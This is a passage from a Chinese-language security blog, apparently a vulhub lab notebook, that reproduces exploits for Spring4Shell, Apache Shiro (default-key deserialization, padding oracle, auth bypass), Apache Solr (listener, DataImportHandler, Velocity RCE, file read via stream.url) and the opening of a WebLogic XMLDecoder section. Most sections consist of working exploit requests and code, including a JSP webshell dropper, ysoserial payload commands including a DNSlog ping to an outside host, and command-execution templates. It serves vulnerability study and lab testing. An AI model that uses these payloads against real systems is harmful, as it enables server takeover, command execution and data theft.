<h3 id="6-Spring-Framework-JDK-gt-x3D-9-RCE（CVE-2022-22965）"><a href="#6-Spring-Framework-JDK-gt-x3D-9-RCE（CVE-2022-22965）" class="headerlink" title="6. Spring Framework JDK &gt;&#x3D; 9 RCE（CVE-2022-22965）"></a>6. Spring Framework JDK &gt;&#x3D; 9 RCE（CVE-2022-22965）</h3><p>在JDK 9+上运行的Spring MVC或Spring WebFlux应用程序可能存在通过数据绑定执行远程代码（RCE）的漏洞。已知的利用方法要求应用程序以WAR部署的形式在Tomcat上运行</p>
<p><strong>漏洞环境</strong></p>
<p>使用vulhub启动一个Spring WebMVC 5.3.17服务：服务启动后，访问<code>http://your-ip:8080/?name=Bob&amp;age=25</code>可看到一个演示页面</p>
<p><strong>漏洞利用</strong></p>
<p>发送如下数据包，即可修改目标的Tomcat日志路径与后缀，利用这个方法写入一个JSP文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">suffix: %&gt;//</span><br><span class="line">c1: Runtime</span><br><span class="line">c2: &lt;%</span><br><span class="line">DNT: 1</span><br></pre></td></tr></table></figure>

<p>然后，访问刚写入的JSP Webshell，执行任意命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=whoami</span><br></pre></td></tr></table></figure>

<p>在利用完成后将class.module.classLoader.resources.context.parent.pipeline.first.pattern清空，否则每次请求都会写入新的恶意代码在JSP Webshell中，导致这个文件变得很大。发送如下数据包将其设置为空：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<h3 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/">https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/spring">https://github.com/vulhub/vulhub/tree/master/spring</a></li>
<li><a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/fullhunt/spring4shell-scan">https://github.com/fullhunt/spring4shell-scan</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/YanMu2020/SpringScan">https://github.com/YanMu2020/SpringScan</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/metaStor/SpringScan">https://github.com/metaStor/SpringScan</a></li>
</ul>
<h2 id="0x03-Apache-Shiro"><a href="#0x03-Apache-Shiro" class="headerlink" title="0x03 Apache Shiro"></a>0x03 Apache Shiro</h2><h3 id="1-Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）"><a href="#1-Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）" class="headerlink" title="1.Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）"></a>1.Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</h3><p><strong>漏洞描述</strong></p>
<p>Apache Shiro是Apache软件基金会的一套用于执行认证、授权、加密和会话管理的Java安全框架。</p>
<p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令</p>
<p><strong>漏洞利用</strong></p>
<p>使用vulhub启动一个使用了Apache Shiro 1.2.4的Web服务：服务启动后，访问<a href="http://your-ip:8080可使用admin:vulhub进行登录">http://your-ip:8080可使用admin:vulhub进行登录</a></p>
<p>使用ysoserial生成CommonsBeanutils1的Gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>

<p>使用Shiro内置的默认密钥对Payload进行加密：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package org.vulhub.shirodemo;</span><br><span class="line"></span><br><span class="line">import org.apache.shiro.crypto.AesCipherService;</span><br><span class="line">import org.apache.shiro.codec.CodecSupport;</span><br><span class="line">import org.apache.shiro.util.ByteSource;</span><br><span class="line">import org.apache.shiro.codec.Base64;</span><br><span class="line">import org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line">import java.nio.file.FileSystems;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class TestRemember &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&quot;/path&quot;, &quot;to&quot;, &quot;poc.ser&quot;));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = Base64.decode(CodecSupport.toBytes(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发送rememberMe Cookie，即可成功执行touch &#x2F;tmp&#x2F;success</p>
<h3 id="2-Apache-Shiro-Padding-Oracle-RCE（CVE-2019-12422）"><a href="#2-Apache-Shiro-Padding-Oracle-RCE（CVE-2019-12422）" class="headerlink" title="2. Apache Shiro Padding Oracle RCE（CVE-2019-12422）"></a>2. Apache Shiro Padding Oracle RCE（CVE-2019-12422）</h3><p><strong>漏洞描述</strong></p>
<p>Apache Shiro 1.4.2之前版本中存在安全漏洞。Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>
<p><strong>漏洞利用</strong></p>
<p>1）登录Shiro网站，从cookie中获得rememberMe字段的值</p>
<p>2）利用DNSlog探测，通过ysoserial工具生成payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping name.ceye.cn&quot; &gt; payload.class</span><br></pre></td></tr></table></figure>

<p>3）使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击</p>
<p>利用工具：<a target="_blank" rel="noopener" href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">PaddingOracleAttack-Shiro-721</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</span><br></pre></td></tr></table></figure>

<p>爆破成功，输出Result</p>
<p>4）使用构造的rememberMe攻击字符串重新请求网站</p>
<p>成功触发Payload，在DNSLog获取到目标IP</p>
<h3 id="3-Apache-Shiro-认证绕过漏洞（CVE-2020-1957）"><a href="#3-Apache-Shiro-认证绕过漏洞（CVE-2020-1957）" class="headerlink" title="3. Apache Shiro 认证绕过漏洞（CVE-2020-1957）"></a>3. Apache Shiro 认证绕过漏洞（CVE-2020-1957）</h3><p><strong>漏洞描述</strong></p>
<p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。在Apache Shiro 1.5.2以前的版本中，在使用Spring动态控制器时，攻击者通过构造<code>..;</code>这样的跳转，可以绕过Shiro中对目录的权限限制</p>
<p><strong>环境搭建</strong></p>
<p>使用vlhub搭建环境，启动一个搭载Spring 2.2.2与Shiro 1.5.1的应用：环境启动后，访问<code>http://your-ip:8080</code>即可查看首页</p>
<p>这个应用中对URL权限的配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@Bean</span><br><span class="line">public ShiroFilterChainDefinition shiroFilterChainDefinition() &#123;</span><br><span class="line">    DefaultShiroFilterChainDefinition chainDefinition = new DefaultShiroFilterChainDefinition();</span><br><span class="line">    chainDefinition.addPathDefinition(&quot;/login.html&quot;, &quot;authc&quot;); // need to accept POSTs from the login form</span><br><span class="line">    chainDefinition.addPathDefinition(&quot;/logout&quot;, &quot;logout&quot;);</span><br><span class="line">    chainDefinition.addPathDefinition(&quot;/admin/**&quot;, &quot;authc&quot;);</span><br><span class="line">    return chainDefinition;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞复现</strong></p>
<p>直接请求管理页面&#x2F;admin&#x2F;，无法访问，将会被重定向到登录页面</p>
<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面</p>
<h3 id="4-Apache-Shiro-lt-1-7-1-权限绕过漏洞（CVE-2020-17523）"><a href="#4-Apache-Shiro-lt-1-7-1-权限绕过漏洞（CVE-2020-17523）" class="headerlink" title="4. Apache Shiro &lt; 1.7.1 权限绕过漏洞（CVE-2020-17523）"></a>4. Apache Shiro &lt; 1.7.1 权限绕过漏洞（CVE-2020-17523）</h3><p><strong>漏洞描述</strong></p>
<p>2021年2月1日，Apache Shiro发布1.7.1版本，修复了 Apache Shiro 身份验证绕过漏洞 (CVE-2020-17523)。攻击者可以使用包含payload的恶意请求绕过Shiro的身份认证</p>
<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://lists.apache.org/thread/qlw2wcn505cnht614sxzvz9bk6bjojso">https://lists.apache.org/thread/qlw2wcn505cnht614sxzvz9bk6bjojso</a></li>
</ul>
<h3 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/157497/Apache-Shiro-1.2.4-Remote-Code-Execution.html">https://packetstormsecurity.com/files/157497/Apache-Shiro-1.2.4-Remote-Code-Execution.html</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1503/">https://paper.seebug.org/1503/</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1457/">https://tttang.com/archive/1457/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193165#h2-11">https://www.anquanke.com/post/id/193165#h2-11</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13239046.html">https://www.cnblogs.com/xiaozi/p/13239046.html</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit">https://github.com/feihong-cs/ShiroExploit</a></li>
</ul>
<h2 id="0x04-Apache-Solr"><a href="#0x04-Apache-Solr" class="headerlink" title="0x04 Apache Solr"></a>0x04 Apache Solr</h2><h3 id="1-Apache-Solr-XXE-amp-RCE-漏洞（CVE-2017-12629）"><a href="#1-Apache-Solr-XXE-amp-RCE-漏洞（CVE-2017-12629）" class="headerlink" title="1. Apache Solr XXE &amp; RCE 漏洞（CVE-2017-12629）"></a>1. Apache Solr XXE &amp; RCE 漏洞（CVE-2017-12629）</h3><p><strong>漏洞描述</strong></p>
<p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。Lucene是apache软件基金会4 jakarta项目组的一个子项目，是一个开放源代码的全文检索引擎工具包。</p>
<p>原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML&#x2F;JSON响应来实现。攻击者利用该漏洞可以获取敏感信息，或者在受影响应用程序上下文中执行任意代码漏洞 </p>
<p><strong>漏洞利用</strong></p>
<p>通过vulhub搭建环境，执行成功后，访问<a target="_blank" rel="noopener" href="http://your-ip:8983/">http://your-ip:8983/</a> 即可查看到Apache solr的管理页面，无需登录</p>
<p>1）首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 158</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>然后进行update操作，触发刚才添加的listener，成功执行命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/update HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">[&#123;&quot;id&quot;:&quot;test&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/43009/">https://www.exploit-db.com/exploits/43009/</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/425/">https://paper.seebug.org/425/</a></li>
</ul>
<h3 id="2-Apache-Solr-DataImport-Handler-命令执行漏洞（CVE-2019-0193）"><a href="#2-Apache-Solr-DataImport-Handler-命令执行漏洞（CVE-2019-0193）" class="headerlink" title="2. Apache Solr DataImport Handler 命令执行漏洞（CVE-2019-0193）"></a>2. Apache Solr DataImport Handler 命令执行漏洞（CVE-2019-0193）</h3><p><strong>漏洞描述</strong></p>
<p>在Apache Solr中，DataImportHandler是一个可选但常用的模块，用于从数据库和其他源中提取数据，它具有一个功能，其中整个DIH配置可以来自请求的”dataConfig”参数。 DIH管理界面的调试模式使用它来方便调试&#x2F;开发DIH配置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。从Solr的8.2.0版开始，使用此参数需要将Java System属性”enable.dih.dataConfigParam”设置为true</p>
<p><strong>漏洞环境</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line">docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db</span><br></pre></td></tr></table></figure>

<p>命令执行成功后，访问<code>http://your-ip:8983/</code>即可查看到Apache solr的管理页面，无需登录</p>
<p><strong>漏洞利用</strong></p>
<p>1）首先打开刚刚创建好的test核心，选择Dataimport功能并选择debug模式，填入以下POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name=&quot;stackoverflow&quot;</span><br><span class="line">            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span><br><span class="line">            processor=&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach=&quot;/feed&quot;</span><br><span class="line">            transformer=&quot;script:poc&quot; /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>

<p>2）点击Execute with this Confuguration会发送以下请求包，成功执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/test/dataimport?_=1565835261600&amp;indent=on&amp;wt=json HTTP/1.1</span><br><span class="line">Host: localhost:8983</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 679</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost:8983/solr/</span><br><span class="line">Cookie: csrftoken=gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid=snzojzqa5zn187oghf06z6xodulpohpr</span><br><span class="line"></span><br><span class="line">command=full-import&amp;verbose=false&amp;clean=false&amp;commit=true&amp;debug=true&amp;core=test&amp;dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&amp;name=dataimport</span><br></pre></td></tr></table></figure>

<p>refer: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SOLR-13669">https://issues.apache.org/jira/browse/SOLR-13669</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1009/">https://paper.seebug.org/1009/</a></li>
</ul>
<h3 id="3-Apache-Solr-Velocity-模版注入RCE（CVE-2019-17558）"><a href="#3-Apache-Solr-Velocity-模版注入RCE（CVE-2019-17558）" class="headerlink" title="3. Apache Solr Velocity 模版注入RCE（CVE-2019-17558）"></a>3. Apache Solr Velocity 模版注入RCE（CVE-2019-17558）</h3><p><strong>漏洞描述</strong></p>
<p>Apache Solr 5.0.0到Apache Solr 8.3.1容易受到通过VelocityResponseWriter执行的远程代码的攻击。Velocity模板可以通过configset ‘ Velocity &#x2F; ‘目录中的Velocity模板或作为参数提供。用户定义的configset可以包含可呈现的、潜在的恶意模板。参数提供的模板在默认情况下是禁用的，但是可以通过设置params.resource.loader来启用。通过定义一个响应写入器并将其设置为true来启用。定义响应编写器需要配置API访问。Solr 8.4完全删除了params资源加载器，只有在configset是”可信的”(由经过身份验证的用户上传)时才启用configset提供的模板呈现</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub启动一个Apache Solr 8.2.0服务器：服务启动后，访问<code>http://your-ip:8983</code>即可查看到一个无需权限的Apache Solr服务</p>
<p>默认情况下params.resource.loader.enabled配置未打开，无法使用自定义模板。先通过如下API获取所有的核心：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure>

<p>通过如下请求开启params.resource.loader.enabled，其中API路径包含刚才获取的core名称</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: solr:8983</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注入Velocity模板即可执行任意命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8983/solr/demo/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>

<p>refer: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/157078/Apache-Solr-8.3.0-Velocity-Template-Remote-Code-Execution.html">https://packetstormsecurity.com/files/157078/Apache-Solr-8.3.0-Velocity-Template-Remote-Code-Execution.html</a></li>
<li><a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SOLR-13971">https://issues.apache.org/jira/browse/SOLR-13971</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/jas502n/solr_rce">https://github.com/jas502n/solr_rce</a></li>
</ul>
<h3 id="4-Apache-Solr-RemoteStreaming-文件读取与SSRF漏洞"><a href="#4-Apache-Solr-RemoteStreaming-文件读取与SSRF漏洞" class="headerlink" title="4. Apache Solr RemoteStreaming 文件读取与SSRF漏洞"></a>4. Apache Solr RemoteStreaming 文件读取与SSRF漏洞</h3><p><strong>漏洞描述</strong></p>
<p>Apache Solr 是一个开源的搜索服务器。在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或任意文件读取</p>
<p><strong>漏洞利用</strong></p>
<p>使用vulhub搭建环境，执行如下命令启动solr 8.8.1：环境启动后，访问<code>http://your-ip:8983</code>即可查看Apache Solr后台</p>
<p>1）首先，访问<code>http://your-ip:8983/solr/admin/cores?indexInfo=false&amp;wt=json</code>获取数据库名</p>
<p>2）发送如下数据包，修改数据库demo的配置，开启RemoteStreaming</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -k -X $&#x27;POST&#x27; \</span><br><span class="line">    -H $&#x27;Content-Type: application/json&#x27; --data-binary $&#x27;&#123;\&quot;set-property\&quot;:&#123;\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true&#125;&#125;&#x27; \</span><br><span class="line">    $&#x27;http://your-ip:8983/solr/demo/config&#x27;</span><br></pre></td></tr></table></figure>

<p>3）再通过stream.url读取任意文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -k &#x27;http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span><br></pre></td></tr></table></figure>

<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ">https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ</a></li>
</ul>
<h2 id="0x05-Weblogic"><a href="#0x05-Weblogic" class="headerlink" title="0x05 Weblogic"></a>0x05 Weblogic</h2><h3 id="1-WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）"><a href="#1-WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）" class="headerlink" title="1. WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）"></a>1. WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）</h3><p><strong>漏洞描述</strong></p>
<p>Oracle Fusion Middleware中的Oracle WebLogic Server组件的WebLogic WLS组件子组件存在远程命令执行漏洞。Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令</p>
<p>受影响WebLogic版本：10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub搭建环境，访问<code>http://your-ip:7001/</code>即可看到一个404页面，说明weblogic已成功启动</p>
<p>发送如下数据包(注意其中反弹shell的语句，需要进行编码)，可反弹shell:</p>
